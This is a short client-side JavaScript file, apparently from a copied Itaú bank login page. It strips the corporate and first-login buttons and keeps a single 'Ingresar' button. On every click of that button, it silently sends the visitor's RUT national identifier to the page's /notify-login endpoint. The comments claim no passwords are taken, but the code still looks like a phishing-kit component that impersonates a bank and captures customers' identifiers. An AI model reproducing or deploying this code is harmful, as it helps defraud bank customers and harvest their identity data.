// public/script.js
document.addEventListener('DOMContentLoaded', () => {
  // 1) Eliminar botones específicos que no queremos
  const removeIds = [
    'btnLoginPortalCorporate',
    'btnLoginPortalCorporate2',
    'btnLoginPortalEmpresas',
    'btnLoginPortalEmpresas2',
    'btnPrimerIngresoCorporate',
    'btnPrimerIngresoEmpresas',
    'btnPrimerIngresoGeneral'
  ];
  removeIds.forEach(id => {
    const el = document.getElementById(id);
    if (el) el.remove();
  });

  // 2) Eliminar duplicados visibles con texto "Ingresar" y mantener el primero
  const allButtons = Array.from(document.querySelectorAll('button, a.itau-btn, a.itau-btn-general'));
  const ingresarBtns = allButtons.filter(b => b.textContent && b.textContent.trim().toLowerCase() === 'ingresar');
  if (ingresarBtns.length > 1) {
    // Mantener el primero y eliminar el resto
    ingresarBtns.slice(1).forEach(b => b.remove());
    console.log('Duplicados de "Ingresar" eliminados.');
  }

  // 3) Función para notificar al servidor (no envía contraseñas)
  async function notifyLogin(rutVal) {
    try {
      await fetch('/notify-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rut: rutVal })
      });
    } catch (err) {
      console.error('Error enviando /notify-login:', err);
    }
  }

  // 4) Delegación de eventos: detectar cualquier click en un botón/anchor con texto "Ingresar"
  document.body.addEventListener('click', (e) => {
    const btn = e.target.closest('button, a');
    if (!btn) return;
    const txt = (btn.textContent || '').trim().toLowerCase();
    if (txt.includes('ingresar')) {
      // Obtener el RUT del formulario (no recoger contraseña)
      const rutInput = document.getElementById('rut_usuarioID') || document.querySelector('input[name="rut_usuario"]');
      const rutVal = rutInput ? rutInput.value.trim() : '';

      // Enviar la notificación (no bloquea la acción del botón)
      notifyLogin(rutVal);
    }
  }, true);

  // 5) Asegurar que hay al menos un botón visible "Ingresar" (si no, mostrar el btnLogin si existe)
  const visibleIngresar = document.querySelector('button, a.itau-btn, a.itau-btn-general');
  if (!visibleIngresar) {
    const fallback = document.getElementById('btnLogin');
    if (fallback) fallback.style.display = 'inline-block';
  }
});
